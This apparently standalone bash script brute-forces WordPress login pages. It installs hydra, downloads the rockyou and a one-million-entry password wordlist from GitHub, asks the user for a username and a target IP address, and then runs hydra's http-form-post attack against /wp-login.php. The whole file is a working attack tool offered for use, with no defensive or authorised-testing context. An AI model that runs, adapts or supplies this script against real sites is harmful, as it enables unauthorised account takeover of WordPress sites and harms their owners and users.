#!/bin/bash
#
# Author: Joseph Hurley
# Purpose: Password brute-forcing

# ANSI escape Codes (for colored output, -e required on echo)
RED='\033[0;31m'
GREEN='\u001b[32m'
NC='\033[0m' # No Color


echo '___       __   ________  ________  ________  ___  ___  _________  ________ ________  ________  ________  _______   ________'
echo '|\  \     |\  \|\   __  \|\   __  \|\   __  \|\  \|\  \|\___   ___\\  _____\\   __  \|\   __  \|\   ____\|\  ___ \ |\   __  \'
echo '\ \  \    \ \  \ \  \|\  \ \  \|\ /\ \  \|\  \ \  \\\  \|___ \  \_\ \  \__/\ \  \|\  \ \  \|\  \ \  \___|\ \   __/|\ \  \|\  \'
echo ' \ \  \  __\ \  \ \   ____\ \   __  \ \   _  _\ \  \\\  \   \ \  \ \ \   __\\ \  \\\  \ \   _  _\ \  \    \ \  \_|/_\ \   _  _\'
echo '  \ \  \|\__\_\  \ \  \___|\ \  \|\  \ \  \\  \\ \  \\\  \   \ \  \ \ \  \_| \ \  \\\  \ \  \\  \\ \  \____\ \  \_|\ \ \  \\  \|'
echo '   \ \____________\ \__\    \ \_______\ \__\\ _\\ \_______\   \ \__\ \ \__\   \ \_______\ \__\\ _\\ \_______\ \_______\ \__\\ _\ '
echo '    \|____________|\|__|     \|_______|\|__|\|__|\|_______|    \|__|  \|__|    \|_______|\|__|\|__|\|_______|\|_______|\|__|\|__|'                                                                                                                       

# install required packages
echo -e "$GREEN""\ndownloading required packages...""$NC"
sudo apt install hydra

# create directories
mkdir ~/wpbruteforcer
mkdir ~/wpbruteforcer/wordlists

# download wordlists
echo -e "$GREEN""downloading wordlists...""$NC"
wget -q https://github.com/Sephley/WPbruteforcer/raw/main/wordlists/rockyou.txt.gz -O ~/wpbruteforcer/wordlists/rockyou.txt.gz
wget -q https://github.com/Sephley/WPbruteforcer/raw/main/wordlists/1milpwlist.txt -O ~/wpbruteforcer/wordlists/1milpwlist.txt

# de-compress rockyou.txt
echo -e "$GREEN""de-compressing wordlists...""$NC"
gzip -d ~/wpbruteforcer/wordlists/rockyou.txt.gz

echo -e "$GREEN""would you like to use a username wordlist, or would you like to try a specific one?\n""$NC"
select w in 'I want to use a wordlist' 'I want to try a specific username'; 
do test -n "$w" && break; 
echo -e "$RED>>> Invalid Selection""$NC"; done

echo -e "$GREEN""enter username: ""$NC"
read -r USERNAME

echo -e "$GREEN""type your destined IP-Address: ""$NC"
read -r IPADDRESS

# variables for wordlists
ROCKYOU='rockyou.txt'
ONEMILPWLIST='1milpwlist.txt'

echo -e "$GREEN""select the wordlist you would like to use\n""$NC"
select d in rockyou.txt 1milpwlist.txt; 
do test -n "$d" && break; 
echo -e "$RED>>> Invalid Selection""$NC"; done

if [ "$REPLY" == 1 ]; then 
    echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
    hydra -l "$USERNAME" -P ~/wpbruteforcer/wordlists/$ROCKYOU "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
else echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
    hydra -l "$USERNAME" -P ~/wpbruteforcer/wordlists/$ONEMILPWLIST "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
fi

# use pw-inspector to filter?
